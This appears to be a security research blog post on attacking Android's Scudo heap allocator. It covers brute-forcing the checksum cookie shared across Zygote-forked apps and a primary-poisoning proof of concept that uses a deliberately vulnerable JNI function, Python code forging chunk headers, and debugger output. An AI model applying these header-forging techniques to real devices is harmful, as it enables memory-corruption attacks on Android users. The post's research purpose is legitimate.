---
title: "Scudo, the Allocator (Part 1)"
date: 2024-07-25T16:46:21+01:00
author: "Pascal Kühnemann"
draft: false
authorTwitter: "" #do not include @
cover: ""
tags: ["Android", "Binary Exploitation", "JNI", "Scudo", "Heap Exploitation"]
keywords: ["Android", "Binary Exploitation", "JNI", "Scudo", "Heap Exploitation"]
description: ""
showFullContent: false
readingTime: true
---

# Binary Exploitation for *Scudo Heap Allocator* on Android

In this series of blog posts, we will investigate how an attacker may leverage the internals of the [*Scudo Allocator*](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/) in order to obtain an advantage on an Android OS. To that end, necessary prerequisites will be discussed and analysed for their likelihood. The focus will primarily be on [`malloc`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c.inc;l=57) and [`free`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c.inc;l=35), although [`realloc`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c.inc;l=122) and other functions may also be of interest. According to [source code](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/METADATA;l=19;drc=45e1036faa0dcfa30a01982880be1137d441333d), the Scudo version considered in this blog is `161cca266a9d0b6deb5f1fd2de8ad543649a7fa1`.

If you have no idea about the fundamentals of *Scudo*, try reading the linked code! The followup blog post discusses *timing side channel attacks* on Scudo and requires some of the basics discussed in this post.

## Necessary Assumptions

Up to this point, no "easy" way of bypassing the checks in the implementations of [`malloc`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=298;drc=b45a2ea782074944f79fc388df20b06e01f265f7) and [`free`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=513) has been found. Therefore it will be unavoidable to assume that certain events have happened already.

The key observation is that every [chunk header](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/chunk.h;l=65) is protected by a checksum, which is verified for every chunk that is passed to `free` via [`Chunk::loadHeader(Cookie, Ptr, &Header)`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=547;drc=b45a2ea782074944f79fc388df20b06e01f265f7). The computations performed when calculating the checksum are architecture - dependent. Therefore, we assume an Intel architecture, i.e. the checksum computation is based on the [`crc32`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/chunk.h;l=31;drc=b45a2ea782074944f79fc388df20b06e01f265f7) instruction.

The checksum depends on
1. a [random 32-bit value](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=988) named `Cookie`
2. a pointer to the user data. This pointer is pointing to the memory located right after the chunk header.
3. the header of the chunk. The checksum is computed over the header with a zeroed - out checksum field.

Also, as [*Zygote* forks itself](https://link.springer.com/article/10.1007/s10207-018-00425-8) when creating a new app, global variables of shared - object files that are already loaded into *Zygote* will remain constant until *Zygote* is restarted. A list of loaded shared - object files can be seen below:
```bash
$ readelf -d /proc/$(pidof zygote64)/exe | grep NEEDED
    0x0000000000000001 (NEEDED)             Shared library: [libandroid_runtime.so]
    0x0000000000000001 (NEEDED)             Shared library: [libbinder.so]
    0x0000000000000001 (NEEDED)             Shared library: [libcutils.so]
    0x0000000000000001 (NEEDED)             Shared library: [libhidlbase.so]
    0x0000000000000001 (NEEDED)             Shared library: [liblog.so]
    0x0000000000000001 (NEEDED)             Shared library: [libnativeloader.so]
    0x0000000000000001 (NEEDED)             Shared library: [libsigchain.so]
    0x0000000000000001 (NEEDED)             Shared library: [libutils.so]
    0x0000000000000001 (NEEDED)             Shared library: [libwilhelm.so]
    0x0000000000000001 (NEEDED)             Shared library: [libc++.so]
    0x0000000000000001 (NEEDED)             Shared library: [libc.so]
    0x0000000000000001 (NEEDED)             Shared library: [libm.so]
    0x0000000000000001 (NEEDED)             Shared library: [libdl.so]

$ cat /proc/$(pidof zygote64)/maps | grep libc.so
730eb404b000-730eb408f000 r--p 00000000 07:60 21    /apex/com.android.runtime/lib64/bionic/libc.so
730eb408f000-730eb411d000 r-xp 00043000 07:60 21    /apex/com.android.runtime/lib64/bionic/libc.so
730eb411d000-730eb4122000 r--p 000d0000 07:60 21    /apex/com.android.runtime/lib64/bionic/libc.so
730eb4122000-730eb4123000 rw-p 000d4000 07:60 21    /apex/com.android.runtime/lib64/bionic/libc.so

$ readelf -s /apex/com.android.runtime/lib64/bionic/libc.so | grep -e " scudo_malloc"
...
    199: 000000000004a0f0    55 FUNC    LOCAL  DEFAULT   14 scudo_malloc
...
```

Thus, *Scudo* is implemented in *libc.so*. Therefore it can be expected that the global variable [`SCUDO_ALLOCATOR`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c_bionic.cpp;l=23;drc=b0193ccac5b8399f9b5ef270d102b5a50f9446ab;bpv=1;bpt=1), which is used to implement [`scudo_malloc`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c.inc;l=57) and so on, is the same across all apps forked from *Zygote*. `SCUDO_ALLOCATOR` is nothing but an [instance](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c_bionic.cpp;l=27;drc=b0193ccac5b8399f9b5ef270d102b5a50f9446ab;bpv=1;bpt=1) of [`scudo::Allocator`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=46;drc=b0193ccac5b8399f9b5ef270d102b5a50f9446ab;bpv=1;bpt=1), which contains the field named [`Cookie`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=988;drc=b0193ccac5b8399f9b5ef270d102b5a50f9446ab;bpv=1;bpt=1). Hence, the `Allocator::Cookie` field can be expected to be the same across all apps forked from *Zygote*.

So we need to get the cookie once (per system restart) and we will be able to exploit *Scudo*/Heap - related vulnerabilities as long as we know necessary pointers. Unless stated otherwise, in the following sections we will **always** assume that we are given sufficient leaks to compute correct checksums!

### Classical Information Leak

Attacks on checksum computation are already out there, e.g. it **has been** possible to compute the `Cookie` from a pointer and header leak (the header contains a valid checksum!) by reformulating the checksum computation as a set of [SMT equations](https://blog.infosectcbr.com.au/2020/04/breaking-secure-checksums-in-scudo_8.html). Unfortunately, comparing the implementation attacked with the implementation we are facing, we can observe that
1. Intel uses a custom generator polynomial to implement `crc32` (see Intel Manual Vol. 2). I.e. `poly = 0x11EDC6F41` instead of the standardized [`0x0104C11DB7`](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwjv-b6ek577AhUfgP0HHTfXDqYQFnoECA0QAQ&url=https%3A%2F%2Fwww.xilinx.com%2Fsupport%2Fdocumentation%2Fapplication_notes%2Fxapp209.pdf&usg=AOvVaw14GnRtGjY_V6hR_uKgWz03).
2. Checksum computation in our cases applies an [additional xor](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/chunk.h;l=32;drc=b45a2ea782074944f79fc388df20b06e01f265f7) in order to reduce the checksum size.

It has not been possible to derive a lookup table for Intel's crc32 implementation. If it had been successful, maybe the SMT attack would have worked. Other attacks involving symbolic execution (via [klee](http://klee.github.io/) based on [this](https://sat-smt.codes/SAT_SMT_by_example.pdf) have also not been successful...). Still, there is another approach to go back to: **brute - force**!

Turns out that using a multi - threaded application to brute - force the `Cookie` overshot the goal. E.g., if we are given:
1. `pointer = 0x7bac6974fd30`
2. `header = 0x20d2000000010101`

brute - forcing the `Cookie` s.t. `computeChecksum(Cookie, pointer, zeroed_header) == checksum(header)` is true resulted in roughly 120155 candidates over the course of 3 seconds... running it for longer of course will yield more results:
```bash
$ head cookies.txt
0x2a7e
0x2000539a
0x6000a052
0x4000d9b6
0x80009213
0xc00061db
0x20014924
0xe000183f
0x130c0
0xa000ebf7
```

Now one might argue that those cookie values are only valid for the above configuration. The funny thing is that at least some of them **work for different configurations as well**! This means that the pointer used to brute - force the cookie can be completely different from the pointer of our buffer! Of course neither every single value has been verified, nor is there a formal proof to why most of the above cookies work. Empirically speaking, e.g. `0x2a7e` worked for crafting fake chunks etc. therefore bypassing the checksum verifications!

### Unprivileged App

Due to the appification, one might argue that it nowadays is easier to execute an app on a targeted mobile device (assuming your average smartphone user) than it has been 10 years ago. Therefore, research regarding *side channel attacks on mobile devices* (e.g. see "An Insight into Android Side-Channel Attacks" for a rough overview on this topic) often assume that there is an unprivileged app already running on the targeted device.

Hence we could also assume that we can at least start an app on the target device. Notice that permissions for [communication over the internet](https://developer.android.com/reference/android/Manifest.permission#INTERNET) are [normal permissions](https://developer.android.com/guide/topics/permissions/overview#normal), i.e. they are specified in the android manifest file of an app and the user is only asked once per installation whether the permissions are fine or not. Therefore we may also assume that an app has almost arbitrary install - time permissions and can leak information via networking.

Adding to the pile, on Android every app is [forked from a process named `Zygote64`](#necessary-assumptions). Convince yourself that `libc.so`
1. contains *Scudo*
2. is loaded by `Zygote64`

Finally, there is only [one instance of the allocator](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c_bionic.cpp;l=27;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1).

Concluding, every app not only has access to the canary used in every app, but also to the `Cookie` used in **every app**. Thus, an unprivileged app can easily leak the cookie, therefore leaving us with *almost* the same setting as the [information leak](#classical-information-leak). The only difference is that we do not have a pointer, which we need to compute the checksum.

### Suitable JNI Code

As always, we will consider small example modules for *damnvulnerableapp*. These will not represent real - world applications, but rather contain obviously vulnerable code like `free(attacker_controlled_buffer + 0x10)`.

## Attack Scenarios on *Scudo* - related Vulnerabilities

From this point onwards, we will try to derive attacks that are applicable to bugs that involve calls to *Scudo* - related functions like `free`. These attacks will be of the form *Proof of Concept*, i.e. e.g. we will already be satisfied, if construction of fake chunks works, instead of achieving arbitrary code execution. The idea here is to get to a comparable point wrt. other heap implementations like [*dlmalloc*](https://www.gnu.org/software/libc/manual/html_node/The-GNU-Allocator.html).

### Freeing Chunks that are not really Chunks

For this section and following subsections we will assume that the target app contains JNI code similar to:
```C
uint8_t *buffer = malloc(0x10);
...
free(buffer + x); // x = 0x10(primary) or 0x40(secondary)
...
```
Disregarding the fact that no programmer would ever call `free` like this, there are always settings where the attention of a developer slips and comparable bugs occur. Also we could reinterpret this as calling `free` on an attacker - controlled pointer.

When calling `free`, internally [`scudo_free`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c.inc;l=35) is executed, which will wind up to call [`deallocate`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=513). There are a few checks we need to pass in order to get to the storage parts of chunks of the allocator:
```C++
...
// [1] Check alignment of pointer provided to deallocate
if (UNLIKELY(!isAligned(reinterpret_cast<uptr>(Ptr), MinAlignment)))
    reportMisalignedPointer(AllocatorAction::Deallocating, Ptr);
...
// [2] Check the checksum of the header. If it is corrupted, the process will be aborted!
Chunk::loadHeader(Cookie, Ptr, &Header);

// [3] Verify that the chunk is not double - freed
if (UNLIKELY(Header.State != Chunk::State::Allocated))
    reportInvalidChunkState(AllocatorAction::Deallocating, Ptr);
...
// [4] Check that e.g. free is used for malloc'ed memory.
if (Options.get(OptionBit::DeallocTypeMismatch)) {
    if (UNLIKELY(Header.OriginOrWasZeroed != Origin)) {
        if (Header.OriginOrWasZeroed != Chunk::Origin::Memalign ||
              Origin != Chunk::Origin::Malloc)
            reportDeallocTypeMismatch(AllocatorAction::Deallocating, Ptr,
                                      Header.OriginOrWasZeroed, Origin);
    }
}
...
// [5] Check the size of the chunk
const uptr Size = getSize(Ptr, &Header);
if (DeleteSize && Options.get(OptionBit::DeleteSizeMismatch)) {
    if (UNLIKELY(DeleteSize != Size))
        reportDeleteSizeMismatch(Ptr, DeleteSize, Size);
}

// [6] This does the actual freeing
quarantineOrDeallocateChunk(Options, TaggedPtr, &Header, Size);
```

From the [call to `deallocate` in `scudo_malloc`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c.inc;l=36) and the [function signature of `deallocate`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=513;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1), we can infer that *\[5\]* is not relevant:
```C++
INTERFACE WEAK void SCUDO_PREFIX(free)(void *ptr) {
  SCUDO_ALLOCATOR.deallocate(ptr, scudo::Chunk::Origin::Malloc);
}

NOINLINE void deallocate(void *Ptr, Chunk::Origin Origin, uptr DeleteSize = 0,
                          UNUSED uptr Alignment = MinAlignment) {...}
```
as `DeleteSize` defaults to `0`! Therefore, as long as [`quarantineOrDeallocateChunk`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1;l=1078) does not apply any more checks on the size, the size can be choosen arbitrarily, i.e. to our advantage.

In [`quarantineOrDeallocateChunk`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1;l=1078), there is a check that determines whether a chunk will be put into quarantine, i.e. its freeing will be hold back to avoid reuse - based attacks. The flag that represents this [check](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=1085;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1) is computed as follows:
```C++
...
// If the quarantine is disabled, the actual size of a chunk is 0 or larger
// than the maximum allowed, we return a chunk directly to the backend.
// This purposefully underflows for Size == 0.
const bool BypassQuarantine = !Quarantine.getCacheSize() ||
                              ((Size - 1) >= QuarantineMaxChunkSize) ||
                              !NewHeader.ClassId;
...
```
Notice that the comment states that "This purposefully underflows for Size == 0", making `BypassQuarantine = true` for `Size = 0` :) Therefore, even if the quarantine was activated by default (which it is not! Notice that `Quarantine.getCacheSize() = thread_local_quarantine_size_kb << 10`, where [`thread_local_quarantine_size_kb = 0`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/flags.inc;l=18;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1)), we could bypass the quarantine by `size = 0`.

There are a few more interesting checks for the chunk (in the bypass branch):
```C++
void *BlockBegin = getBlockBegin(Ptr, &NewHeader);
const uptr ClassId = NewHeader.ClassId;
if (LIKELY(ClassId)) {
    ...
    TSD->Cache.deallocate(ClassId, BlockBegin);
    ...
} else {
    ...
    Secondary.deallocate(Options, BlockBegin);
}

...
static inline void *getBlockBegin(const void *Ptr,
                                  Chunk::UnpackedHeader *Header) {
  return reinterpret_cast<void *>(
      reinterpret_cast<uptr>(Ptr) - Chunk::getHeaderSize() -
      (static_cast<uptr>(Header->Offset) << MinAlignmentLog));
}
```
Observe that we control `NewHeader.ClassId` and `Header->Offset` (maybe `Header->Offset` can be used for [memory probing](#future-work)).

From this point onwards, we can distinguish attacks that use the primary or the secondary!

#### Primary Poisoning

If we want to get to `Cache.deallocate`, we will need [`NewHeader.ClassId > 0`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=1118;drc=b45a2ea782074944f79fc388df20b06e01f265f7) to pass the check.

Investigating [`Cache.deallocate`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1;l=84), which is the primary, reveals:
```C++
void deallocate(uptr ClassId, void *P) {
  CHECK_LT(ClassId, NumClasses);
  PerClass *C = &PerClassArray[ClassId];
  ...
  C->Chunks[C->Count++] =
      Allocator->compactPtr(ClassId, reinterpret_cast<uptr>(P));
  ...
}
```

Thus, if we get through all the checks, when `Cache.deallocate` is called, our fake chunk will be part of the list! One way to verify this is to create a JNI function of the form:
```C
#define BUFFER_SIZE 0x20

static uint8_t called = 0;
static uint8_t *buffer = NULL;

JNIEXPORT jbyteArray JNICALL Java_com_damnvulnerableapp_vulnerable_modules_PoCPrimaryPoisoning_free(
        JNIEnv *env,
        jobject class,
        jbyteArray chunk) {

    // Leaks the pointer of a global buffer on first call.
    if (!called) {
        called++;
        buffer = malloc(BUFFER_SIZE);   // enough memory to store full classid 1 chunk
        jbyteArray ar = (*env)->NewByteArray(env, 8);
        jbyte *leak = (jbyte*)&buffer;
        (*env)->SetByteArrayRegion(env, ar, 0, 8, leak);
        return ar;
    }

    // Calls free(buffer + 0x10) and tries to avoid heap meta data overflows
    uint8_t *raw = (uint8_t*)(*env)->GetByteArrayElements(env, chunk, NULL);
    uint32_t length = (*env)->GetArrayLength(env, chunk);
    if (raw) {
        memcpy(buffer, raw, (length <= BUFFER_SIZE) ? length : BUFFER_SIZE);

        // Brings attacker - controlled chunk into primary
        free(buffer + 0x10); // combined header

        uint8_t *new = malloc(0x10);
        jbyteArray output = (*env)->NewByteArray(env, 0x10);
        (*env)->SetByteArrayRegion(env, output, 0, 0x10, new);
        return output;
    }
    return NULL;
}
```
Then, an attacker could write the header first, then 8 bytes of padding, followed by e.g. a string "Hello World!". Lets see that in action!

Lets say the first call to this function leaked `pointer = 0x7bac7976f730` and say we somehow got **a** cookie from a previous leak or so, `Cookie = 0x2a7e`. Then we could use the following code to craft the fake header:
```py
combined_header = unpacked_header()
combined_header.ClassId = 1 # Smallest allocation class --> primary, user_data_size=0x10
combined_header.State = 1   # = Allocated --> cannot free a free chunk
combined_header.SizeOrUnusedBytes = 0   # Bypass quarantine (actually irrelevant)
combined_header.OriginOrWasZeroed = 0   # = allocated via malloc
combined_header.Offset = 0  # chunk_start ~= usr_ptr - header_size - offset
combined_header.Checksum = utils.android_crc32(
    cookie, # 0x2a7e
    pointer + 0x10, # buffer = 0x7bac7976f730 => buffer + 0x10 fake user data
    combined_header.pack()  # u64 representation of this header, with checksum=0
)
```
With the above, the header looks like `0x75a5000000000101` (mind little - endian).

If we send `combined_header.bytes() + p64(0) + b'Hello World!` and set a breakpoint right before the call to `free(buffer + 0x10)`, we get:
```
...
gef➤  i r rdi
    rdi            0x7bac7976f740      0x7bac7976f740
gef➤  x/4gx $rdi-0x10
    0x7bac7976f730:	0x75a5000000000101	0x0000000000000000
    0x7bac7976f740:	0x6f57206f6c6c6548	0x0000000021646c72
...
```
Notice that the leaked pointer is `0x7bac7976f730`! So this looks promising! Stepping over `free` will either tell us that we messed up by aborting, or will work and thus our fake chunk is in the primary.

It seems to have worked! The next call is to `malloc(0x10)` (see that the actual chunk size will be `0x20`, if `malloc(0x10)` is called, because [header](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=337;drc=b45a2ea782074944f79fc388df20b06e01f265f7) and [padding](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=338;drc=b45a2ea782074944f79fc388df20b06e01f265f7) are also stored). As `combined_header.ClassId = 1`, the chunk that we freed is part of the chunk array that is used to serve `malloc(0x10)` calls! Executing `malloc(0x10)` yields:
```
gef➤  i r edi
    edi            0x10                0x10
gef➤  ni
    ...
gef➤  i r rax
    rax            0x7bac7976f740      0x7bac7976f740
gef➤  x/s $rax
    0x7bac7976f740:	"Hello World!"
```
Remember that we called `free(buffer + 0x10) = free(0x7bac7976f730 + 0x10) = free(0x7bac7976f740)`!

Therefore, not only did we move a chunk of size `0x30` (includes header size `0x10`; remember that `buffer = malloc(BUFFER_SIZE = 0x20)`) to the chunk array that contains chunks of size only `0x20`. But we also served a "preinitialized" chunk. Notice that we basically performed two different things at the same time:
1. Served an *arbitrary* chunk (we will soon see that this cannot be *that arbitrary*...)
2. Preinitialized data. This is actually unexpected, but a nice feature :) Basically, this allows us to infer that [`Options.getFillContentsMode() = NoFill`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=329;drc=b45a2ea782074944f79fc388df20b06e01f265f7), which comes from [setting the flags](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=153;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1) where [`zero_contents = false`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/flags.inc;l=35;drc=b45a2ea782074944f79fc388df20b06e01f265f7) and [`pattern_fill_contents = false`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/flags.inc;l=37;drc=b45a2ea782074944f79fc388df20b06e01f265f7)! This will result in a check that determines [what to do with the contents](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=471;drc=b45a2ea782074944f79fc388df20b06e01f265f7) to evaluate to `false`.

##### Pitfalls and Challenges

The above primary poisoning seems to work perfectly, but I have not told you what assumptions lie in the dark...

Lets try to come up with a list of assumptions and constraints (ignoring the base assumption of availability of sufficient leaks and "classical" ones like that chunk addresses have to be aligned).

###### Thievish Threads
As multiple threads share the same allocator (even the same TSD, which contains a cache that represents the primary), another thread could snack our fake chunk just introduced into the primary. Therefore, **primary poisoning is probabilistic**!

Moreover the thread that runs the JNI function could be [assigned another TSD](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=356;drc=b45a2ea782074944f79fc388df20b06e01f265f7), because the old one is overloaded, i.e. there are lots of threads using the same TSD. Again, we would never see our chunk again.

[It looks like every thread could be assigned every TSD after *sufficient execution time*](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/tsd_shared.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1;l=161) (further analysis is needed to fully prove this). This might be beneficial in some cases where we want to attack code that is running in another thread.

###### Multi - Threaded Chunk Liberation

The chunk array might be [drained](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=91;drc=b45a2ea782074944f79fc388df20b06e01f265f7), because the amount of free chunks, represented by [`C->Count`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=90;drc=b45a2ea782074944f79fc388df20b06e01f265f7), exceeds an upper bound. E.g. `C->MaxCount = 13` for class id 1, because we can distinguish the following cases for `C->Count`:
1. [`C->Count = C->MaxCount / 2`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=183;drc=b45a2ea782074944f79fc388df20b06e01f265f7). This stems from the fact that `deallocate` can create batches if the corresponding `Chunks` array is full. To be precise, this will trigger the execution of [`drain`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=182;drc=b45a2ea782074944f79fc388df20b06e01f265f7), where `C->Count = C->MaxCount`. Therefore the minimum `Count = Min(C->MaxCount / 2, C->Count)` in `drain` will evaluate to `0 < C->MaxCount / 2 < C->MaxCount`. Finally, `C->Count -= Count <=> C->Count = C->MaxCount - C->MaxCount / 2 = C->MaxCount / 2`. Notice that [`C->MaxCount = 2 * TransferBatch::getMaxCached(Size)`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=133;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1). As can be seen in the next step, for `malloc(0x10)`, this will result in `C->MaxCount = 2 * 13 = 26 => C->Count = 26 / 2 = 13`.
2. [`C->Count = MaxCount`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/primary64.h;l=396;drc=b45a2ea782074944f79fc388df20b06e01f265f7), i.e.:
    ```C++
    C->Count = MaxCount
            = TransferBatch::getMaxCached(Size)
            = Min(MaxNumCached, SizeClassMap::getMaxCachedHint(Size))
            = Min(13, Max(1U, Min(Config::MaxNumCachedHint, N)))
            = Min(13, Max(1U, Min(13, (1U << Config::MaxBytesCachedLog) / static_cast<u32>(Size))))
            = Min(13, Max(1U, Min(13, (1U << 13) / Classes[ClassId - 1])))
    ```
    where [`Classes`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/size_class_map.h;l=269;drc=b45a2ea782074944f79fc388df20b06e01f265f7):
    ```C++
    static constexpr u32 Classes[] = {
        0x00020, 0x00030, 0x00040, 0x00050, 0x00060, 0x00070, 0x00080, 0x00090,
        0x000a0, 0x000b0, 0x000c0, 0x000e0, 0x000f0, 0x00110, 0x00120, 0x00130,
        0x00150, 0x00160, 0x00170, 0x00190, 0x001d0, 0x00210, 0x00240, 0x002a0,
        0x00330, 0x00370, 0x003a0, 0x00400, 0x00430, 0x004a0, 0x00530, 0x00610,
        0x00730, 0x00840, 0x00910, 0x009c0, 0x00a60, 0x00b10, 0x00ca0, 0x00e00,
        0x00fb0, 0x01030, 0x01130, 0x011f0, 0x01490, 0x01650, 0x01930, 0x02010,
        0x02190, 0x02490, 0x02850, 0x02d50, 0x03010, 0x03210, 0x03c90, 0x04090,
        0x04510, 0x04810, 0x05c10, 0x06f10, 0x07310, 0x08010, 0x0c010, 0x10010,
    };
    ```

So for a small allocation, i.e. for `ClassId = 1`, we get:
```C++
C->MaxCount = Min(13, Max(1U, Min(13, 0x2000 / 0x20)))
        = Min(13, Max(1U, Min(13, 256)))
        = Min(13, Max(1U, 13))
        = 13
```
Lets say we have `C->Count = 13` and we introduce our fake chunk. Then, on execution of [`deallocate`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=84;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1), we get that `C->Count = C->MaxCount` and therefore [`drain`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=182;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1) is called. By itself, this would not be an issue, because `drain` will only remove the oldest half of the chunks and move the other chunks to the front of the array. But what happens, if there is another thread that wants to free memory? Assuming that the thread performs `C->MaxCount / 2 + 1` calls to `deallocate`, this will trigger `drain` again and therefore result in our chunk being [pushed back](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=192;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1) onto a free list.

###### Fake Chunk Mispositioning

The fake chunk may be "at the wrong location". To that end, notice that [compacting a pointer](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=95;drc=b45a2ea782074944f79fc388df20b06e01f265f7) is done as follows:
```C++
CompactPtrT compactPtr(uptr ClassId, uptr Ptr) {
    DCHECK_LE(ClassId, SizeClassMap::LargestClassId);
    return compactPtrInternal(getCompactPtrBaseByClassId(ClassId), Ptr);
}
...
uptr getCompactPtrBaseByClassId(uptr ClassId) {
    // If we are not compacting pointers, base everything off of 0.
    if (sizeof(CompactPtrT) == sizeof(uptr) && CompactPtrScale == 0)
        return 0;
    return getRegionInfo(ClassId)->RegionBeg;
}
...
static CompactPtrT compactPtrInternal(uptr Base, uptr Ptr) {
    return static_cast<CompactPtrT>((Ptr - Base) >> CompactPtrScale);
}
```
Basically, a pointer is compacted by subtracting the base address of the region that belongs to a specific class id (e.g. 1) from that pointer and right - shifting the resulting relative offset by some value (often [4](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/platform.h;l=61;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1), which makes sense in terms of alignment).

When supplying an address from a different segment to `free(addr + 0x10)`, we have to ensure that this address is bigger than the base address of the class the fake chunk "belongs" to. E.g. if we put a fake chunk on the stack, i.e. at `0x7babf2c25890` with a header of `0x2542000000000101`, but the *base* of the region holding class id 1 chunks is `0x7bac69744000`, then:
```
sub 0x7babf2c25890, 0x7bac69744000 = 0xfffffffff894e189 -> underflow
```
Notice that it is (most likely) an invariant that the *base* is always smaller than or equal to the address of the chunk to be freed. Therefore, this could be undefined behaviour! The bits 4 to 35 (inclusive) of `0xfffffffff894e189`, i.e. `0xff894e18`, will be stored in the `Chunks` array via (`r15 = ptr to store`):
```
...
   0x00007baef7fc106b <+523>:	sub    r15,QWORD PTR [rdx+rsi*1+0x60] # subtraction from above
   0x00007baef7fc1070 <+528>:	shr    r15,0x4
   0x00007baef7fc1074 <+532>:	lea    edx,[rax+0x1]
   0x00007baef7fc1077 <+535>:	mov    DWORD PTR [r14],edx
   0x00007baef7fc107a <+538>:	mov    eax,eax
   0x00007baef7fc107c <+540>:	mov    DWORD PTR [r14+rax*4+0x10],r15d
...
```

When `malloc` is called, then the following is executed (`r14d = compacted pointer`):
```
...
   0x00007baef7fbcba5 <+389>:	mov    r14d,DWORD PTR [rbx+rax*4+0x10]  # r14d = compacted pointer
   0x00007baef7fbcbaa <+394>:	add    QWORD PTR [r15+0xf88],rcx    # stats
   0x00007baef7fbcbb1 <+401>:	sub    QWORD PTR [r15+0xf90],rcx    # stats
   0x00007baef7fbcbb8 <+408>:	mov    rax,QWORD PTR [r15+0xfa0]
   0x00007baef7fbcbbf <+415>:	lea    rcx,[r12+r12*2]
   0x00007baef7fbcbc3 <+419>:	shl    rcx,0x6
   0x00007baef7fbcbc7 <+423>:	shl    r14,0x4
   0x00007baef7fbcbcb <+427>:	add    r14,QWORD PTR [rax+rcx*1+0x60]
...
```
